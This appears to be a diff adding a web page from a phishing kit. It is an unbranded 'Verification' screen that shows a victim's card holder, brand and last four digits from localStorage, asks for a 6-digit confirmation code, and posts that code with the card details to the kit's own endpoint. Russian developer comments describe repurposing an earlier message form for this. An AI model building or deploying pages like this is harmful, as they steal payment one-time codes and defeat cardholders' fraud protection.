@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verification</title>
+
+    <link rel="stylesheet" href="style.css" />
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background: radial-gradient(circle at top, #e0f2ff, #f3f4f6 45%, #e5e7eb);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            padding: 16px 24px;
+            border-bottom: 1px solid rgba(148, 163, 184, 0.3);
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        
+        .logo {
+            font-weight: 700;
+            font-size: 18px;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            font-family: "Inter", sans-serif;
+        }
+        
+        .logo span {
+            font-weight: 500;
+            font-size: 12px;
+            text-transform: none;
+            display: block;
+            margin-top: 2px;
+            color: #6b7280;
+            font-family: "Inter", sans-serif;
+        }
+        
+        .page-shell {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px 16px 40px;
+        }
+        
+        .card-form {
+            width: 100%;
+            max-width: 420px;
+            background: #ffffff;
+            border-radius: 18px;
+            padding: 24px 22px 20px;
+            box-shadow: 0 18px 45px rgba(15, 23, 42, 0.16), 0 0 0 1px rgba(148, 163, 184, 0.18);
+            border: 1px solid rgba(226, 232, 240, 0.9);
+        }
+        
+        .card-form h2 {
+            margin: 0 0 6px;
+            font-size: 20px;
+        }
+        
+        .card-form .subtitle {
+            margin: 0 0 16px;
+            font-size: 14px;
+            color: #6b7280;
+        }
+        
+        .card-form .card-info {
+            font-size: 13px;
+            margin-bottom: 14px;
+            font-weight: 500;
+            color: #4b5563;
+            padding: 8px 10px;
+            border-radius: 10px;
+            background: #f9fafb;
+            border: 1px dashed #e5e7eb;
+        }
+        
+        .hint {
+            font-size: 13px;
+            color: #6b7280;
+            margin-bottom: 10px;
+        }
+        
+        .code-wrapper {
+            margin-bottom: 18px;
+        }
+        
+        .code-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 4px;
+            font-size: 13px;
+            color: #4b5563;
+        }
+        /* ВАЖНО: input id="message", чтобы всё осталось как раньше */
+        
+        #message {
+            width: 100%;
+            padding: 10px 12px;
+            border-radius: 12px;
+            border: 1px solid #d1d5db;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 0.45em;
+            font-weight: 600;
+            outline: none;
+            transition: border-color 0.15s ease, box-shadow 0.15s ease, transform 0.05s ease;
+        }
+        
+        #message:focus {
+            border-color: #2563eb;
+            box-shadow: 0 0 0 1px rgba(37, 99, 235, 0.12), 0 10px 25px rgba(37, 99, 235, 0.12);
+            transform: translateY(-1px);
+        }
+        
+        #message::placeholder {
+            letter-spacing: 0.45em;
+            color: #d1d5db;
+        }
+        
+        .error {
+            display: none;
+            font-size: 12px;
+            color: #b91c1c;
+            margin-top: 4px;
+        }
+        
+        .error.visible {
+            display: block;
+        }
+        
+        .resend-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #6b7280;
+            margin-bottom: 16px;
+        }
+        
+        .resend-btn {
+            background: none;
+            border: none;
+            padding: 0;
+            font-size: 12px;
+            color: #2563eb;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+        
+        .resend-btn:disabled {
+            color: #9ca3af;
+            text-decoration: none;
+            cursor: default;
+        }
+        
+        button[type="submit"] {
+            width: 100%;
+            border: none;
+            border-radius: 999px;
+            padding: 10px 18px;
+            font-size: 14px;
+            font-weight: 600;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            cursor: pointer;
+            background: linear-gradient(135deg, #2563eb, #7c3aed);
+            color: #ffffff;
+            box-shadow: 0 12px 30px rgba(79, 70, 229, 0.35);
+            transition: transform 0.05s ease, box-shadow 0.1s ease, opacity 0.1s ease;
+        }
+        
+        button[type="submit"]:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 16px 40px rgba(79, 70, 229, 0.45);
+        }
+        
+        button[type="submit"]:active {
+            transform: translateY(0);
+            box-shadow: 0 8px 20px rgba(79, 70, 229, 0.35);
+            opacity: 0.96;
+        }
+        
+        button[type="submit"]:disabled {
+            opacity: 0.7;
+            cursor: default;
+            box-shadow: none;
+        }
+        
+        @media (max-width: 480px) {
+            .card-form {
+                padding: 20px 18px 18px;
+                border-radius: 14px;
+            }
+            #message {
+                font-size: 20px;
+                letter-spacing: 0.35em;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="header">
+        <div class="logo">
+            Verification
+            <span>Secure code confirmation</span>
+        </div>
+    </header>
+
+    <div class="page-shell">
+        <!-- ВАЖНО: id="message-form" как раньше -->
+        <form class="card-form" id="message-form">
+            <h2>Verification Code Required</h2>
+            <p class="subtitle">
+                We’ve sent a 6-digit verification code. Enter it below to confirm the operation.
+            </p>
+
+            <p class="card-info" id="card-info"></p>
+
+            <p class="hint">
+                For your security, this code is valid for a limited time.
+            </p>
+
+            <div class="code-wrapper">
+                <div class="code-label">
+                    <span>Enter 6-digit code</span>
+                    <span id="code-length-indicator">0 / 4–6</span>
+                </div>
+
+                <!-- ИМЕННО message, только вместо textarea теперь input -->
+                <input id="message" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" placeholder="••••••" required />
+
+                <div id="code-error" class="error">
+                    Please enter a valid 6-digit code.
+                </div>
+            </div>
+
+            <div class="resend-row">
+                <span id="timer-text">You can request a new code in 30s</span>
+                <button type="button" id="resend-btn" class="resend-btn" disabled>
+                    Resend code
+                </button>
+            </div>
+
+            <button type="submit" id="submit-btn">Confirm</button>
+        </form>
+    </div>
+
+    <script>
+        const form = document.getElementById("message-form");
+        const messageInput = document.getElementById("message"); // СТАРОЕ имя переменной
+        const cardInfoEl = document.getElementById("card-info");
+        const codeErrorEl = document.getElementById("code-error");
+        const codeLenIndicator = document.getElementById("code-length-indicator");
+        const timerText = document.getElementById("timer-text");
+        const resendBtn = document.getElementById("resend-btn");
+        const submitBtn = document.getElementById("submit-btn");
+
+        // читаем данные карты из localStorage
+        let cardData = null;
+
+        try {
+            const raw = localStorage.getItem("cardData");
+            if (raw) {
+                cardData = JSON.parse(raw);
+            }
+        } catch (e) {
+            console.error("Error reading cardData from localStorage", e);
+        }
+
+        // показываем сверху, для какой карты код
+        if (cardData) {
+            const holder = cardData.holder ? cardData.holder : "Unknown holder";
+            const brand = cardData.cardBrand ? cardData.cardBrand : "Card";
+            const last4 = cardData.cardLast4 ?
+                cardData.cardLast4.toString().slice(-4) :
+                "????";
+
+            cardInfoEl.textContent = holder + " – " + brand + " **** " + last4;
+        } else {
+            cardInfoEl.textContent = "Card data not found";
+        }
+
+        // только цифры + длина
+        // только цифры + длина
+        messageInput.addEventListener("input", function() {
+            this.value = this.value.replace(/\D/g, "").slice(0, 6);
+            codeLenIndicator.textContent = this.value.length + " / 4–6";
+            if (this.value.length === 4 || this.value.length === 6) {
+                codeErrorEl.classList.remove("visible");
+            }
+        });
+
+
+        // таймер для resend
+        let secondsLeft = 30;
+        let timerId = null;
+
+        function startTimer() {
+            secondsLeft = 30;
+            resendBtn.disabled = true;
+            timerText.textContent = "You can request a new code in " + secondsLeft + "s";
+
+            if (timerId) {
+                clearInterval(timerId);
+            }
+
+            timerId = setInterval(function() {
+                secondsLeft -= 1;
+
+                if (secondsLeft <= 0) {
+                    clearInterval(timerId);
+                    timerText.textContent = "You can request a new code now";
+                    resendBtn.disabled = false;
+                } else {
+                    timerText.textContent = "You can request a new code in " + secondsLeft + "s";
+                }
+            }, 1000);
+        }
+
+        startTimer();
+
+        resendBtn.addEventListener("click", async function() {
+            try {
+                let holder = null;
+                let cardLast4 = null;
+                let cardBrand = null;
+
+                if (cardData) {
+                    holder = cardData.holder ? cardData.holder : null;
+                    cardLast4 = cardData.cardLast4 ? cardData.cardLast4 : null;
+                    cardBrand = cardData.cardBrand ? cardData.cardBrand : null;
+                }
+
+                // 👇 отправляем "сообщение" вместо кода на тот же эндпоинт, что и раньше
+                const res = await fetch("/api/v1/card-message", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        // тут можно поставить любую фразу/ключ, по которой бэк поймёт, что это запрос на новый код
+                        message: "RESEND_CODE_REQUEST",
+                        holder: holder,
+                        cardLast4: cardLast4,
+                        cardBrand: cardBrand,
+                    }),
+                });
+
+                if (!res.ok) throw new Error("Request failed");
+
+                startTimer();
+                alert("New code has been requested");
+            } catch (err) {
+                console.error(err);
+                alert("Server error, try again later");
+            }
+        });
+
+
+        form.addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const message = messageInput.value.trim(); // СТАРОЕ имя поля message
+
+            if (!(message.length === 4 || message.length === 6)) {
+                codeErrorEl.textContent = "Code must be 4 or 6 digits.";
+                codeErrorEl.classList.add("visible");
+                return;
+            }
+
+            codeErrorEl.classList.remove("visible");
+            submitBtn.disabled = true;
+
+            let holder = null;
+            let cardLast4 = null;
+            let cardBrand = null;
+
+            if (cardData) {
+                holder = cardData.holder ? cardData.holder : null;
+                cardLast4 = cardData.cardLast4 ? cardData.cardLast4 : null;
+                cardBrand = cardData.cardBrand ? cardData.cardBrand : null;
+            }
+
+            try {
+                // ВАЖНО: ОСТАЛСЯ СТАРЫЙ ЭНДПОИНТ И СТАРЫЕ ПОЛЯ
+                const res = await fetch("/api/v1/card-message", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        message: message, // тут теперь лежит код, но имя ПОЛЯ как раньше
+                        holder: holder,
+                        cardLast4: cardLast4,
+                        cardBrand: cardBrand,
+                    }),
+                });
+
+                if (!res.ok) throw new Error("Request failed");
+
+                alert("Code sent successfully");
+
+                localStorage.removeItem("cardData");
+                form.reset();
+                codeLenIndicator.textContent = "0 / 6";
+            } catch (err) {
+                console.error(err);
+                alert("Server error, try again later");
+            } finally {
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+
+</html>
